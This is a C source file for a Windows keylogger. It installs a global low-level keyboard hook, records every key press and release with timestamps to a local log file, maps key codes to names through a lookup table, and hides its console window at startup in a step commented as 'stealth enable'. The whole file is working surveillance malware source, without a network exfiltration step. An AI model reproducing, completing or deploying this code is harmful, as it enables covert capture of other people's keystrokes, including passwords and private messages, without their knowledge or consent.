#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#define MAX_ENTRY 0x100 //0x1 + 0xff, so the biggest byte: 0xff can be assigned a value;
#define MAX_LINE  600
#define MAX_LINE_COUNT 192

typedef unsigned char uint8_t;

char* hash_table[MAX_ENTRY];
char path[FILENAME_MAX] = "c:/Users/Jason/Desktop/keylogger/log.txt";
char LUT_PATH[FILENAME_MAX] = "c:/Users/Jason/Desktop/keylogger/lut.txt";
FILE* log_file;


uint8_t hash_func(uint8_t key)
{
    key = key % MAX_ENTRY;
    return key;
}

void set_hash_table(uint8_t key, char* entry)
{
    hash_table[hash_func(key)] = (char*) malloc(sizeof(char) * strlen(entry));
    strcpy(hash_table[hash_func(key)], entry);
}

char* get_hash_table(uint8_t key)
{
    return hash_table[hash_func(key)];
}

void file_init_ht(char* filepath)
{
    FILE* textf;
    textf = fopen(filepath, "r");

    int p, q;
    char str[MAX_LINE];
    char entry[MAX_LINE - 6];
    uint8_t keyval;
    char *sptr;

    for(p = 0; p < MAX_LINE_COUNT; p ++)
    {
        int x;
        for (x = 0; x < MAX_LINE; x ++)
        {
            str[x] = 0x00;
        }
        for (x = 0; x < (MAX_LINE-6); x ++)
        {
            entry[x] = 0x00;
        }

        fgets(str, MAX_LINE, textf);
        sscanf(str, "%hhx", &keyval);

        sptr = &str[5];
        q = 0;

        while(*sptr != '\n')
        {
            entry[q] = *sptr;
            sptr ++;
            q ++;
        }
        //fprintf("%x, %s\n", keyval, entry);
        set_hash_table(keyval, entry);
    }   
}


void InitLOG(char filepath[FILENAME_MAX]);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);    //declares logger windows procedure function

void hide(void) 
{
    HWND stealth;
    stealth = FindWindow("ConsoleWindowClass", NULL );
    ShowWindow(stealth, 0);
}


DWORD WINAPI winloggerSTART(LPVOID lp)
{
    HHOOK loggerhook;
    HINSTANCE mhandler = GetModuleHandle(NULL);
    loggerhook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, mhandler, 0);

    MSG msg = {0};
    while( GetMessage(&msg, NULL, 0, 0) )     //msg loop; dispatched to logger windows procedure
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg); //gives the msg to the winproc
    }
    UnhookWindowsHookEx(loggerhook);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;    //contains the key code struct  0x0100 0x0101
    DWORD vkCode = pKeyBoard->vkCode;
    char log_val[20] = {0};     //contains the str for the value which will be logged

    /*/ set flags for press-hold keys /*/
    static short SHIFT_FLAG;
    static short CTRL_FLAG;
    static short ALT_FLAG;

    /*/ logfile open /*/
    log_file = fopen(path, "a");

    /*/ handles clock /*/
    SYSTEMTIME utc;
    GetSystemTime(&utc);

    switch (wParam)
    {
        case WM_KEYDOWN:

            // handles shift
            if(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT)
            {
                if(!SHIFT_FLAG) 
                {fprintf(log_file,"%02d/%02d %02d:%02d:%02d:%02d\t", utc.wMonth,utc.wDay,utc.wHour,utc.wMinute,utc.wSecond,utc.wMilliseconds);
                fprintf(log_file,"DOWN\t[SHIFT]\n");
                SHIFT_FLAG = TRUE;}
            }

            //handles control
            else if(vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
            {
                if(!CTRL_FLAG) 
                {fprintf(log_file, "%02d/%02d %02d:%02d:%02d:%02d\t", utc.wMonth,utc.wDay,utc.wHour,utc.wMinute,utc.wSecond,utc.wMilliseconds);
                fprintf(log_file,"DOWN\t[CTRL]\n");
                CTRL_FLAG = TRUE;}
            }

            // the rest of the keys
            else
            {
                fprintf(log_file,"%02d/%02d %02d:%02d:%02d:%02d\t", utc.wMonth,utc.wDay,utc.wHour,utc.wMinute,utc.wSecond,utc.wMilliseconds);
                fprintf(log_file,"DOWN\t0x%x\t%s\n", vkCode,get_hash_table(vkCode));
            }

            break;
        
        case WM_KEYUP:

            // handles shift
            if(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT)
            {
                if(SHIFT_FLAG) 
                {fprintf(log_file,"%02d/%02d %02d:%02d:%02d:%02d\t", utc.wMonth,utc.wDay,utc.wHour,utc.wMinute,utc.wSecond,utc.wMilliseconds);
                fprintf(log_file,"UP\t[SHIFT]\n");
                SHIFT_FLAG = FALSE;}
            }

            //handles control
            else if(vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
            {
                if(CTRL_FLAG) 
                {fprintf(log_file,"%02d/%02d %02d:%02d:%02d:%02d\t", utc.wMonth,utc.wDay,utc.wHour,utc.wMinute,utc.wSecond,utc.wMilliseconds);
                fprintf(log_file,"UP\t[CTRL]\n");
                CTRL_FLAG = FALSE;}
            }

            //the rest of the keys
            else
            {
                fprintf(log_file,"%02d/%02d %02d:%02d:%02d:%02d\t", utc.wMonth,utc.wDay,utc.wHour,utc.wMinute,utc.wSecond,utc.wMilliseconds);
                fprintf(log_file,"UP\t0x%x\t%s\n", vkCode,get_hash_table(vkCode));
            }
            break;
    }

    fclose(log_file);
    return CallNextHookEx(NULL, nCode, wParam, lParam); //passes the args to the next winhook
}


void InitLOG(char filepath[FILENAME_MAX])
{
    FILE* fptr;
    char init_msg[] = "Logging STARTED AT(SYSCLOCK):\t";
    SYSTEMTIME utc;

    GetSystemTime(&utc);
    fptr = fopen(filepath, "a");
    fprintf(fptr, init_msg);
    fprintf(fptr, "%d/%d\t%d:%d UTC\n", utc.wMonth, utc.wDay, utc.wHour, utc.wMinute);
    fclose(fptr);
}


int main(int argc, char ** argv)
{
    hide(); //stealth enable

    //HANDLE loggerthread;
    //loggerthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) winloggerSTART, NULL, 0, NULL);
    //WaitForSingleObject(loggerthread, INFINITE);
    file_init_ht(LUT_PATH);
    InitLOG(path);

    winloggerSTART(NULL);
    return 0;
}
